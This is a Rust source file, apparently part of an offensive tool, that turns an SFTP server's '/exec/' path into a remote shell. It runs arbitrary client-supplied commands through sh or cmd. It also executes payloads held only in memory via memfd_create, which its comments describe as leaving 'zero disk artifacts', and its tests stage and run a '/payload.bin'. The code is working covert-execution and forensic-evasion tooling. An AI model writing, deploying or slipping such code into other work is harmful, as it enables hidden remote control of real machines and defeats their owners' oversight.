//! Shared helpers for the `/exec/` magic directory.
//!
//! When an SFTP client accesses a path under `/exec/`, the path component
//! after the prefix is executed as a shell command and the output is returned
//! as virtual file content.  This gives shell-like access through any
//! standard SFTP client.

use russh_sftp::protocol::FileAttributes;

use crate::memfs::MemFs;

/// Prefix that activates command execution.
const EXEC_PREFIX: &str = "/exec/";

/// Check whether `path` refers to the `/exec/` magic directory or a command
/// beneath it.
pub fn is_exec_path(path: &str) -> bool {
    path == "/exec" || path == "/exec/" || path.starts_with(EXEC_PREFIX)
}

/// Extract the command string after `/exec/`.
///
/// Returns `None` when the path is just the directory itself (`/exec/` or
/// `/exec`) with no command component.
pub fn extract_command(path: &str) -> Option<&str> {
    if let Some(cmd) = path.strip_prefix(EXEC_PREFIX) {
        if cmd.is_empty() {
            None
        } else {
            Some(cmd)
        }
    } else {
        None
    }
}

/// Execute `cmd` via the platform shell and return merged stdout + stderr.
///
/// On Unix the command is run through `sh -c`, on Windows through `cmd /C`.
pub fn run_command(cmd: &str) -> Vec<u8> {
    let output = if cfg!(target_os = "windows") {
        std::process::Command::new("cmd").args(["/C", cmd]).output()
    } else {
        std::process::Command::new("sh").args(["-c", cmd]).output()
    };

    match output {
        Ok(o) => {
            let mut buf = o.stdout;
            buf.extend_from_slice(&o.stderr);
            buf
        }
        Err(e) => format!("exec error: {}\n", e).into_bytes(),
    }
}

/// Execute `cmd` with in-memory file support from [`MemFs`].
///
/// Scans the command string for absolute paths (starting with `/`).  If any
/// path matches a file in the provided `MemFs`, the file contents are made
/// available to the command:
///
/// - **Linux:** Uses `memfd_create()` to create an anonymous in-memory file
///   descriptor and replaces the path in the command with `/proc/self/fd/<N>`.
///   The binary runs directly from RAM with zero disk artifacts.
/// - **Windows:** Writes the file to a temporary path, executes the command
///   with the substituted path, and deletes the temp file immediately after.
///
/// If no MemFs file is referenced, the command executes normally via
/// [`run_command`].
pub fn run_command_with_memfs(cmd: &str, memfs: &MemFs) -> Vec<u8> {
    // Scan for paths starting with `/` that exist in MemFs.
    if let Some((memfs_path, data)) = find_memfs_path(cmd, memfs) {
        return execute_with_memfs_file(cmd, &memfs_path, &data);
    }

    // No MemFs file referenced — run normally.
    run_command(cmd)
}

/// Scan the command string for absolute paths that exist in the [`MemFs`].
///
/// Returns the first matching path and its file contents, or `None`.
fn find_memfs_path(cmd: &str, memfs: &MemFs) -> Option<(String, Vec<u8>)> {
    // Tokenize by whitespace and look for tokens starting with `/`.
    for token in cmd.split_whitespace() {
        if token.starts_with('/') {
            // Try the token as-is (it may contain trailing punctuation).
            if let Ok(data) = memfs.read_file(token) {
                return Some((token.to_string(), data));
            }
        }
    }
    None
}

/// Execute a command after substituting a MemFs file path with a platform-
/// appropriate temporary or in-memory file.
#[cfg(target_os = "linux")]
fn execute_with_memfs_file(cmd: &str, memfs_path: &str, data: &[u8]) -> Vec<u8> {
    use std::ffi::CString;
    use std::io::Write;
    use std::os::fd::FromRawFd;

    // SAFETY: `memfd_create` creates an anonymous file backed by RAM.
    // The returned fd is valid and owned by this process. We use
    // `MFD_CLOEXEC` so the fd is not leaked to child processes unless
    // we explicitly re-open it via `/proc/self/fd/<N>`.  However, we
    // deliberately strip CLOEXEC below so the child can access the fd
    // through the /proc path.
    let fd = unsafe {
        let name = CString::new("neap").expect("CString::new failed");
        libc::memfd_create(name.as_ptr(), 0)
    };

    if fd < 0 {
        return format!("memfd_create failed: {}\n", std::io::Error::last_os_error()).into_bytes();
    }

    // SAFETY: `fd` is a valid file descriptor returned by `memfd_create`
    // above.  Wrapping it in a `std::fs::File` transfers ownership so the
    // fd is closed when the `File` is dropped.
    let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
    if let Err(e) = file.write_all(data) {
        return format!("memfd write failed: {}\n", e).into_bytes();
    }

    // Make the memfd executable.
    // SAFETY: `fd` is still valid (owned by `file`). `fchmod` sets
    // permission bits on an open file descriptor.
    unsafe {
        libc::fchmod(fd, 0o755);
    }

    let proc_path = format!("/proc/self/fd/{}", fd);
    let new_cmd = cmd.replace(memfs_path, &proc_path);

    let output = std::process::Command::new("sh")
        .args(["-c", &new_cmd])
        .output();

    // `file` (and thus `fd`) is dropped here, closing the memfd.
    drop(file);

    match output {
        Ok(o) => {
            let mut buf = o.stdout;
            buf.extend_from_slice(&o.stderr);
            buf
        }
        Err(e) => format!("exec error: {}\n", e).into_bytes(),
    }
}

/// Execute a command after substituting a MemFs file path with a temporary
/// file on disk (Windows fallback).
#[cfg(not(target_os = "linux"))]
fn execute_with_memfs_file(cmd: &str, memfs_path: &str, data: &[u8]) -> Vec<u8> {
    use std::io::Write;

    let temp_dir = std::env::temp_dir();
    // Derive a temp filename from the original path.
    let basename = std::path::Path::new(memfs_path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("neap_tmp");
    let temp_path = temp_dir.join(format!("neap_{}", basename));

    // Write MemFs contents to temp file.
    let write_result = (|| -> std::io::Result<()> {
        let mut f = std::fs::File::create(&temp_path)?;
        f.write_all(data)?;
        Ok(())
    })();

    if let Err(e) = write_result {
        return format!("temp file write failed: {}\n", e).into_bytes();
    }

    let temp_str = temp_path.to_string_lossy();
    let new_cmd = cmd.replace(memfs_path, &temp_str);

    let output = if cfg!(target_os = "windows") {
        std::process::Command::new("cmd")
            .args(["/C", &new_cmd])
            .output()
    } else {
        std::process::Command::new("sh")
            .args(["-c", &new_cmd])
            .output()
    };

    // Clean up temp file immediately after execution.
    let _ = std::fs::remove_file(&temp_path);

    match output {
        Ok(o) => {
            let mut buf = o.stdout;
            buf.extend_from_slice(&o.stderr);
            buf
        }
        Err(e) => format!("exec error: {}\n", e).into_bytes(),
    }
}

/// Build [`FileAttributes`] that describe the `/exec/` virtual directory.
pub fn exec_dir_attrs() -> FileAttributes {
    let mut attrs = FileAttributes {
        size: Some(0),
        uid: Some(0),
        gid: Some(0),
        permissions: Some(0o755),
        atime: Some(0),
        mtime: Some(0),
        ..FileAttributes::empty()
    };
    attrs.set_dir(true);
    attrs
}

/// Build [`FileAttributes`] for a virtual file whose content is `len` bytes.
pub fn exec_file_attrs(len: u64) -> FileAttributes {
    let mut attrs = FileAttributes {
        size: Some(len),
        uid: Some(0),
        gid: Some(0),
        permissions: Some(0o444),
        atime: Some(0),
        mtime: Some(0),
        ..FileAttributes::empty()
    };
    attrs.set_regular(true);
    attrs
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_exec_path() {
        assert!(is_exec_path("/exec/"));
        assert!(is_exec_path("/exec"));
        assert!(is_exec_path("/exec/whoami"));
        assert!(is_exec_path("/exec/ls -la /tmp"));
        assert!(!is_exec_path("/tmp/exec"));
        assert!(!is_exec_path("/executable"));
        assert!(!is_exec_path("/etc/passwd"));
    }

    #[test]
    fn test_extract_command() {
        assert_eq!(extract_command("/exec/whoami"), Some("whoami"));
        assert_eq!(extract_command("/exec/ls -la /tmp"), Some("ls -la /tmp"));
        assert_eq!(extract_command("/exec/"), None);
        assert_eq!(extract_command("/exec"), None);
        assert_eq!(extract_command("/tmp/file"), None);
    }

    #[test]
    fn test_run_command() {
        // A command that should work on every platform.
        let out = if cfg!(target_os = "windows") {
            run_command("echo hello")
        } else {
            run_command("echo hello")
        };
        let text = String::from_utf8_lossy(&out);
        assert!(text.contains("hello"), "expected 'hello' in {:?}", text);
    }

    #[test]
    fn test_find_memfs_path_no_match() {
        let fs = MemFs::new();
        assert!(find_memfs_path("echo hello", &fs).is_none());
    }

    #[test]
    fn test_find_memfs_path_with_match() {
        let mut fs = MemFs::new();
        let root = if cfg!(windows) {
            std::path::PathBuf::from("C:\\")
        } else {
            std::path::PathBuf::from("/")
        };
        fs.create_file(root.join("payload.bin"), b"PAYLOAD".to_vec())
            .unwrap();
        // On non-Windows the path is `/payload.bin`; verify lookup works.
        if !cfg!(windows) {
            let result = find_memfs_path("chmod +x /payload.bin && /payload.bin", &fs);
            assert!(result.is_some());
            let (path, data) = result.unwrap();
            assert_eq!(path, "/payload.bin");
            assert_eq!(data, b"PAYLOAD");
        }
    }

    #[test]
    fn test_run_command_with_memfs_no_match() {
        // When no MemFs path is referenced, it should behave like run_command.
        let fs = MemFs::new();
        let out = run_command_with_memfs("echo memfs_test", &fs);
        let text = String::from_utf8_lossy(&out);
        assert!(
            text.contains("memfs_test"),
            "expected 'memfs_test' in {:?}",
            text
        );
    }

    #[test]
    fn test_exec_dir_attrs() {
        let attrs = exec_dir_attrs();
        assert!(attrs.is_dir());
    }

    #[test]
    fn test_exec_file_attrs() {
        let attrs = exec_file_attrs(42);
        assert!(attrs.is_regular());
        assert_eq!(attrs.size, Some(42));
    }
}
